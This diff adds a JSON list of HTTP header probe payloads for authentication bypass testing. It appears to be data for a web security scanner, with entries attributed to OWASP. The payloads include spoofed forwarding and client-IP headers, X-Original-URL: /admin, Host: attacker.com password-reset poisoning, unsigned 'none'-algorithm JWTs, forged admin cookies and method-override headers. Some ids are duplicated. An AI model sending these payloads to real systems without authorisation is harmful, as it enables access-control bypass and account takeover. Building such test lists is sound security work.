@@ -1,0 +1,434 @@
+[
+  {
+    "id": "authentication-bypass-owasp-0001",
+    "name": "Authentication Bypass",
+    "template": "X-Forwarded-Server: 127.0.0.1",
+    "description": "Authentication Bypass probe from OWASP. Tests application handling of: X-Forwarded-Server: 127.0.0.1"
+  },
+  {
+    "id": "authentication-bypass-owasp-0002",
+    "name": "Authentication Bypass #2",
+    "template": "Referer: 127.0.0.1",
+    "description": "Authentication Bypass probe from OWASP. Tests application handling of: Referer: 127.0.0.1"
+  },
+  {
+    "id": "authentication-bypass-owasp-0003",
+    "name": "Authentication Bypass #3",
+    "template": "X-Http-Host-Override: 127.0.0.1",
+    "description": "Authentication Bypass probe from OWASP. Tests application handling of: X-Http-Host-Override: 127.0.0...."
+  },
+  {
+    "id": "authentication-bypass-owasp-0004",
+    "name": "Authentication Bypass #4",
+    "template": "X-Forwarded-Port: 8443",
+    "description": "Authentication Bypass probe from OWASP. Tests application handling of: X-Forwarded-Port: 8443"
+  },
+  {
+    "id": "authentication-bypass-owasp-0005",
+    "name": "Authentication Bypass #5",
+    "template": "Proxy-Url: 127.0.0.1",
+    "description": "Authentication Bypass probe from OWASP. Tests application handling of: Proxy-Url: 127.0.0.1"
+  },
+  {
+    "id": "authentication-bypass-owasp-0006",
+    "name": "Authentication Bypass #6",
+    "template": "X-Forwarded-By: 127.0.0.1",
+    "description": "Authentication Bypass probe from OWASP. Tests application handling of: X-Forwarded-By: 127.0.0.1"
+  },
+  {
+    "id": "authentication-bypass-owasp-0007",
+    "name": "Authentication Bypass #7",
+    "template": "X-Originating-IP: 127.0.0.1",
+    "description": "Authentication Bypass probe from OWASP. Tests application handling of: X-Originating-IP: 127.0.0.1"
+  },
+  {
+    "id": "authentication-bypass-owasp-0008",
+    "name": "Authentication Bypass #8",
+    "template": "X-Forwarded-Scheme: https",
+    "description": "Authentication Bypass probe from OWASP. Tests application handling of: X-Forwarded-Scheme: https"
+  },
+  {
+    "id": "authentication-bypass-owasp-0009",
+    "name": "Authentication Bypass #9",
+    "template": "Client-IP: 127.0.0.1",
+    "description": "Authentication Bypass probe from OWASP. Tests application handling of: Client-IP: 127.0.0.1"
+  },
+  {
+    "id": "authentication-bypass-owasp-0010",
+    "name": "Authentication Bypass #10",
+    "template": "X-Real-Ip: 127.0.0.1",
+    "description": "Authentication Bypass probe from OWASP. Tests application handling of: X-Real-Ip: 127.0.0.1"
+  },
+  {
+    "id": "authentication-bypass-owasp-0011",
+    "name": "Authentication Bypass #11",
+    "template": "X-Forward-For: 127.0.0.1",
+    "description": "Authentication Bypass probe from OWASP. Tests application handling of: X-Forward-For: 127.0.0.1"
+  },
+  {
+    "id": "authentication-bypass-owasp-0012",
+    "name": "Authentication Bypass #12",
+    "template": "X-Rewrite-Url: 127.0.0.1",
+    "description": "Authentication Bypass probe from OWASP. Tests application handling of: X-Rewrite-Url: 127.0.0.1"
+  },
+  {
+    "id": "authentication-bypass-owasp-0013",
+    "name": "Authentication Bypass #13",
+    "template": "Http-Url: 127.0.0.1",
+    "description": "Authentication Bypass probe from OWASP. Tests application handling of: Http-Url: 127.0.0.1"
+  },
+  {
+    "id": "authentication-bypass-owasp-0014",
+    "name": "Authentication Bypass #14",
+    "template": "X-Forwarded-Port: 443",
+    "description": "Authentication Bypass probe from OWASP. Tests application handling of: X-Forwarded-Port: 443"
+  },
+  {
+    "id": "authentication-bypass-owasp-0015",
+    "name": "Authentication Bypass #15",
+    "template": "X-Client-IP: 127.0.0.1",
+    "description": "Authentication Bypass probe from OWASP. Tests application handling of: X-Client-IP: 127.0.0.1"
+  },
+  {
+    "id": "authentication-bypass-owasp-0016",
+    "name": "Authentication Bypass #16",
+    "template": "Base-Url: 127.0.0.1",
+    "description": "Authentication Bypass probe from OWASP. Tests application handling of: Base-Url: 127.0.0.1"
+  },
+  {
+    "id": "authentication-bypass-owasp-0017",
+    "name": "Authentication Bypass #17",
+    "template": "X-Original-Url: 127.0.0.1",
+    "description": "Authentication Bypass probe from OWASP. Tests application handling of: X-Original-Url: 127.0.0.1"
+  },
+  {
+    "id": "authentication-bypass-owasp-0018",
+    "name": "Authentication Bypass #18",
+    "template": "X-Forwarder-For: 127.0.0.1",
+    "description": "Authentication Bypass probe from OWASP. Tests application handling of: X-Forwarder-For: 127.0.0.1"
+  },
+  {
+    "id": "authentication-bypass-owasp-0019",
+    "name": "Authentication Bypass #19",
+    "template": "X-Forwarded-Port: 8080",
+    "description": "Authentication Bypass probe from OWASP. Tests application handling of: X-Forwarded-Port: 8080"
+  },
+  {
+    "id": "authentication-bypass-owasp-0020",
+    "name": "Authentication Bypass #20",
+    "template": "X-Forwarded: 127.0.0.1",
+    "description": "Authentication Bypass probe from OWASP. Tests application handling of: X-Forwarded: 127.0.0.1"
+  },
+  {
+    "id": "authentication-bypass-owasp-0021",
+    "name": "Authentication Bypass #21",
+    "template": "X-True-IP: 127.0.0.1",
+    "description": "Authentication Bypass probe from OWASP. Tests application handling of: X-True-IP: 127.0.0.1"
+  },
+  {
+    "id": "authentication-bypass-owasp-0022",
+    "name": "Authentication Bypass #22",
+    "template": "X-Original-Remote-Addr: 127.0.0.1",
+    "description": "Authentication Bypass probe from OWASP. Tests application handling of: X-Original-Remote-Addr: 127.0...."
+  },
+  {
+    "id": "authentication-bypass-owasp-0023",
+    "name": "Authentication Bypass #23",
+    "template": "Real-Ip: 127.0.0.1",
+    "description": "Authentication Bypass probe from OWASP. Tests application handling of: Real-Ip: 127.0.0.1"
+  },
+  {
+    "id": "authentication-bypass-owasp-0024",
+    "name": "Authentication Bypass #24",
+    "template": "Uri: 127.0.0.1",
+    "description": "Authentication Bypass probe from OWASP. Tests application handling of: Uri: 127.0.0.1"
+  },
+  {
+    "id": "authentication-bypass-owasp-0025",
+    "name": "Authentication Bypass #25",
+    "template": "X-Forwarded-Host: 127.0.0.1",
+    "description": "Authentication Bypass probe from OWASP. Tests application handling of: X-Forwarded-Host: 127.0.0.1"
+  },
+  {
+    "id": "authentication-bypass-owasp-0026",
+    "name": "Authentication Bypass #26",
+    "template": "X-Remote-IP: 127.0.0.1",
+    "description": "Authentication Bypass probe from OWASP. Tests application handling of: X-Remote-IP: 127.0.0.1"
+  },
+  {
+    "id": "authentication-bypass-owasp-0027",
+    "name": "Authentication Bypass #27",
+    "template": "Redirect: 127.0.0.1",
+    "description": "Authentication Bypass probe from OWASP. Tests application handling of: Redirect: 127.0.0.1"
+  },
+  {
+    "id": "authentication-bypass-owasp-0028",
+    "name": "Authentication Bypass #28",
+    "template": "X-Custom-IP-Authorization: 127.0.0.1",
+    "description": "Authentication Bypass probe from OWASP. Tests application handling of: X-Custom-IP-Authorization: 127..."
+  },
+  {
+    "id": "authentication-bypass-owasp-0029",
+    "name": "Authentication Bypass #29",
+    "template": "Referrer: 127.0.0.1",
+    "description": "Authentication Bypass probe from OWASP. Tests application handling of: Referrer: 127.0.0.1"
+  },
+  {
+    "id": "authentication-bypass-owasp-0030",
+    "name": "Authentication Bypass #30",
+    "template": "Proxy-Host: 127.0.0.1",
+    "description": "Authentication Bypass probe from OWASP. Tests application handling of: Proxy-Host: 127.0.0.1"
+  },
+  {
+    "id": "authentication-bypass-owasp-0031",
+    "name": "Authentication Bypass #31",
+    "template": "X-Forwarded-Port: 80",
+    "description": "Authentication Bypass probe from OWASP. Tests application handling of: X-Forwarded-Port: 80"
+  },
+  {
+    "id": "authentication-bypass-owasp-0032",
+    "name": "Authentication Bypass #32",
+    "template": "X-Forwarded-Scheme: http",
+    "description": "Authentication Bypass probe from OWASP. Tests application handling of: X-Forwarded-Scheme: http"
+  },
+  {
+    "id": "authentication-bypass-owasp-0033",
+    "name": "Authentication Bypass #33",
+    "template": "Url: 127.0.0.1",
+    "description": "Authentication Bypass probe from OWASP. Tests application handling of: Url: 127.0.0.1"
+  },
+  {
+    "id": "authentication-bypass-owasp-0034",
+    "name": "Authentication Bypass #34",
+    "template": "X-Http-Destinationurl: 127.0.0.1",
+    "description": "Authentication Bypass probe from OWASP. Tests application handling of: X-Http-Destinationurl: 127.0.0..."
+  },
+  {
+    "id": "authentication-bypass-owasp-0035",
+    "name": "Authentication Bypass #35",
+    "template": "Request-Uri: 127.0.0.1",
+    "description": "Authentication Bypass probe from OWASP. Tests application handling of: Request-Uri: 127.0.0.1"
+  },
+  {
+    "id": "authentication-bypass-owasp-0036",
+    "name": "Authentication Bypass #36",
+    "template": "Refferer: 127.0.0.1",
+    "description": "Authentication Bypass probe from OWASP. Tests application handling of: Refferer: 127.0.0.1"
+  },
+  {
+    "id": "authentication-bypass-owasp-0037",
+    "name": "Authentication Bypass #37",
+    "template": "X-Proxy-Url: 127.0.0.1",
+    "description": "Authentication Bypass probe from OWASP. Tests application handling of: X-Proxy-Url: 127.0.0.1"
+  },
+  {
+    "id": "authentication-bypass-owasp-0038",
+    "name": "Authentication Bypass #38",
+    "template": "X-Host: 127.0.0.1",
+    "description": "Authentication Bypass probe from OWASP. Tests application handling of: X-Host: 127.0.0.1"
+  },
+  {
+    "id": "authentication-bypass-owasp-0039",
+    "name": "Authentication Bypass #39",
+    "template": "X-Forwarded-For: 127.0.0.1",
+    "description": "Authentication Bypass probe from OWASP. Tests application handling of: X-Forwarded-For: 127.0.0.1"
+  },
+  {
+    "id": "authentication-bypass-owasp-0040",
+    "name": "Authentication Bypass #40",
+    "template": "X-Forwarded-For-Original: 127.0.0.1",
+    "description": "Authentication Bypass probe from OWASP. Tests application handling of: X-Forwarded-For-Original: 127...."
+  },
+  {
+    "id": "authentication-bypass-owasp-0041",
+    "name": "Authentication Bypass #41",
+    "template": "X-Remote-Addr: 127.0.0.1",
+    "description": "Authentication Bypass probe from OWASP. Tests application handling of: X-Remote-Addr: 127.0.0.1"
+  },
+  {
+    "id": "authentication-bypass-owasp-0029",
+    "name": "Header injection #2",
+    "template": "X-Original-URL: /admin",
+    "description": "Header injection probe from OWASP. Tests application handling of: X-Original-URL: /admin"
+  },
+  {
+    "id": "authentication-bypass-owasp-0030",
+    "name": "Header injection #3",
+    "template": "X-Rewrite-URL: /admin",
+    "description": "Header injection probe from OWASP. Tests application handling of: X-Rewrite-URL: /admin"
+  },
+  {
+    "id": "authentication-bypass-owasp-0035",
+    "name": "Header injection #8",
+    "template": "X-Real-IP: 127.0.0.1",
+    "description": "Header injection probe from OWASP. Tests application handling of: X-Real-IP: 127.0.0.1"
+  },
+  {
+    "id": "authentication-bypass-owasp-0036",
+    "name": "Header injection #9",
+    "template": "X-Host: localhost",
+    "description": "Header injection probe from OWASP. Tests application handling of: X-Host: localhost"
+  },
+  {
+    "id": "authentication-bypass-owasp-0037",
+    "name": "Header injection #10",
+    "template": "X-Forwarded-Host: localhost",
+    "description": "Header injection probe from OWASP. Tests application handling of: X-Forwarded-Host: localhost"
+  },
+  {
+    "id": "authentication-bypass-owasp-0101",
+    "name": "Host header injection for password reset poisoning",
+    "template": "Host: attacker.com",
+    "description": "Host header injection for password reset poisoning probe from OWASP. Tests application handling of: Host: attacker.com"
+  },
+  {
+    "id": "authentication-bypass-owasp-0102",
+    "name": "Host header injection for password reset poisoning #2",
+    "template": "X-Forwarded-Host: attacker.com",
+    "description": "Host header injection for password reset poisoning probe from OWASP. Tests application handling of: X-Forwarded-Host: attacker.com"
+  },
+  {
+    "id": "authentication-bypass-owasp-0103",
+    "name": "Host header injection for password reset poisoning #3",
+    "template": "X-Host: attacker.com",
+    "description": "Host header injection for password reset poisoning probe from OWASP. Tests application handling of: X-Host: attacker.com"
+  },
+  {
+    "id": "authentication-bypass-owasp-0126",
+    "name": "JWT manipulation (see JWT-Vulnerabilities for more)",
+    "template": "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4ifQ.",
+    "description": "JWT manipulation (see JWT-Vulnerabilities for more) probe from OWASP. Tests application handling of: Authorization: Bearer eyJhbGci..."
+  },
+  {
+    "id": "authentication-bypass-owasp-0127",
+    "name": "JWT manipulation (see JWT-Vulnerabilities for more) #2",
+    "template": "Authorization: Bearer null",
+    "description": "JWT manipulation (see JWT-Vulnerabilities for more) probe from OWASP. Tests application handling of: Authorization: Bearer null"
+  },
+  {
+    "id": "authentication-bypass-owasp-0128",
+    "name": "JWT manipulation (see JWT-Vulnerabilities for more) #3",
+    "template": "Authorization: Bearer",
+    "description": "JWT manipulation (see JWT-Vulnerabilities for more) probe from OWASP. Tests application handling of: Authorization: Bearer"
+  },
+  {
+    "id": "authentication-bypass-owasp-0129",
+    "name": "JWT manipulation (see JWT-Vulnerabilities for more) #4",
+    "template": "Authorization:",
+    "description": "JWT manipulation (see JWT-Vulnerabilities for more) probe from OWASP. Tests application handling of: Authorization:"
+  },
+  {
+    "id": "authentication-bypass-owasp-0141",
+    "name": "API key bypass #2",
+    "template": "X-API-Key:",
+    "description": "API key bypass probe from OWASP. Tests application handling of: X-API-Key:"
+  },
+  {
+    "id": "authentication-bypass-owasp-0150",
+    "name": "Rate limiting bypass",
+    "template": "X-Forwarded-For: random_ip_each_request",
+    "description": "Rate limiting bypass probe from OWASP. Tests application handling of: X-Forwarded-For: random_ip_eac..."
+  },
+  {
+    "id": "authentication-bypass-owasp-0151",
+    "name": "Rate limiting bypass #2",
+    "template": "X-Originating-IP: random_ip_each_request",
+    "description": "Rate limiting bypass probe from OWASP. Tests application handling of: X-Originating-IP: random_ip_ea..."
+  },
+  {
+    "id": "authentication-bypass-owasp-0152",
+    "name": "Rate limiting bypass #3",
+    "template": "X-Remote-IP: random_ip_each_request",
+    "description": "Rate limiting bypass probe from OWASP. Tests application handling of: X-Remote-IP: random_ip_each_re..."
+  },
+  {
+    "id": "authentication-bypass-owasp-0181",
+    "name": "Host header authentication bypass",
+    "template": "Host: localhost",
+    "description": "Host header authentication bypass probe from OWASP. Tests application handling of: Host: localhost"
+  },
+  {
+    "id": "authentication-bypass-owasp-0182",
+    "name": "Host header authentication bypass #2",
+    "template": "Host: 127.0.0.1",
+    "description": "Host header authentication bypass probe from OWASP. Tests application handling of: Host: 127.0.0.1"
+  },
+  {
+    "id": "authentication-bypass-owasp-0183",
+    "name": "Host header authentication bypass #3",
+    "template": "Host: internal.company.com",
+    "description": "Host header authentication bypass probe from OWASP. Tests application handling of: Host: internal.company.com"
+  },
+  {
+    "id": "authentication-bypass-owasp-0184",
+    "name": "Referer bypass",
+    "template": "Referer: https://trusted-site.com",
+    "description": "Referer bypass probe from OWASP. Tests application handling of: Referer: https://trusted-site...."
+  },
+  {
+    "id": "authentication-bypass-owasp-0185",
+    "name": "Referer bypass #2",
+    "template": "Referer: https://localhost",
+    "description": "Referer bypass probe from OWASP. Tests application handling of: Referer: https://localhost"
+  },
+  {
+    "id": "authentication-bypass-owasp-0186",
+    "name": "Origin bypass",
+    "template": "Origin: https://trusted-site.com",
+    "description": "Origin bypass probe from OWASP. Tests application handling of: Origin: https://trusted-site.c..."
+  },
+  {
+    "id": "authentication-bypass-owasp-0187",
+    "name": "Origin bypass #2",
+    "template": "Origin: null",
+    "description": "Origin bypass probe from OWASP. Tests application handling of: Origin: null"
+  },
+  {
+    "id": "authentication-bypass-owasp-0194",
+    "name": "Request smuggling for authentication bypass",
+    "template": "Content-Length: 0",
+    "description": "Request smuggling for authentication bypass probe from OWASP. Tests application handling of: Content-Length: 0"
+  },
+  {
+    "id": "authentication-bypass-owasp-0195",
+    "name": "Request smuggling for authentication bypass #2",
+    "template": "Transfer-Encoding: chunked",
+    "description": "Request smuggling for authentication bypass probe from OWASP. Tests application handling of: Transfer-Encoding: chunked"
+  },
+  {
+    "id": "authentication-bypass-owasp-0199",
+    "name": "JWT \"none\" algorithm bypass",
+    "template": "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiJ9.",
+    "description": "JWT \"none\" algorithm bypass probe from OWASP. Tests application handling of: Authorization: Bearer eyJhbGci..."
+  },
+  {
+    "id": "authentication-bypass-owasp-0200",
+    "name": "JWT \"none\" algorithm bypass #2",
+    "template": "alg: none",
+    "description": "JWT \"none\" algorithm bypass probe from OWASP. Tests application handling of: alg: none"
+  },
+  {
+    "id": "authentication-bypass-owasp-0246",
+    "name": "Authentication via header injection",
+    "template": "Cookie: authenticated=true; admin=true",
+    "description": "Authentication via header injection probe from OWASP. Tests application handling of: Cookie: authenticated=true; ad..."
+  },
+  {
+    "id": "authentication-bypass-owasp-0247",
+    "name": "Authentication via header injection #2",
+    "template": "Cookie: PHPSESSID=admin_session; role=administrator",
+    "description": "Authentication via header injection probe from OWASP. Tests application handling of: Cookie: PHPSESSID=admin_sessio..."
+  },
+  {
+    "id": "authentication-bypass-owasp-0260",
+    "name": "Authentication bypass via request method override",
+    "template": "X-HTTP-Method-Override: GET",
+    "description": "Authentication bypass via request method override probe from OWASP. Tests application handling of: X-HTTP-Method-Override: GET"
+  },
+  {
+    "id": "authentication-bypass-owasp-0261",
+    "name": "Authentication bypass via request method override #2",
+    "template": "X-Method-Override: GET",
+    "description": "Authentication bypass via request method override probe from OWASP. Tests application handling of: X-Method-Override: GET"
+  }
+]
